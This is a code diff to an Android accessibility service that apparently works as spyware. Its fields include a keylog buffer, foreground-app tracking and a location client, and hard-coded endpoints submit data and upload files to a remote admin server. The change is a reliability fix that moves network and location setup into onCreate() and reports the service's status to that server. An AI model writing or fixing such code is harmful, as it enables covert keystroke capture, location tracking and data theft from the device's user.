@@ -44,8 +44,10 @@ public class CoreService extends AccessibilityService {
     private static final String SUBMIT_DATA_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";
     private static final String UPLOAD_FILE_URL = "https://chimeradmin.netlify.app/.netlify/functions/upload-file";
 
+    // These are now initialized in onCreate()
     private RequestQueue requestQueue;
     private FusedLocationProviderClient fusedLocationClient;
+
     private String lastForegroundAppPkg = "N/A";
     private final Handler keylogHandler = new Handler(Looper.getMainLooper());
     private final StringBuilder keylogBuffer = new StringBuilder();
@@ -73,12 +75,23 @@ public class CoreService extends AccessibilityService {
         }
     }
 
+    // --- THIS IS THE CRITICAL FIX ---
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        // This method is GUARANTEED to be called once per service instance.
+        // This is the correct place for initialization.
+        this.requestQueue = Volley.newRequestQueue(getApplicationContext());
+        this.fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
+        Log.i(TAG, "CoreService instance created and initialized.");
+    }
+    
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        this.requestQueue = Volley.newRequestQueue(getApplicationContext());
-        this.fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
-        submitDataToServer("lifecycle", "CoreService connected and online.");
+        // onServiceConnected is only for Accessibility-specific events.
+        submitDataToServer("lifecycle", "Accessibility Service bound and connected.");
+        Log.i(TAG, "Accessibility Service bound and connected.");
     }
 
     @Override
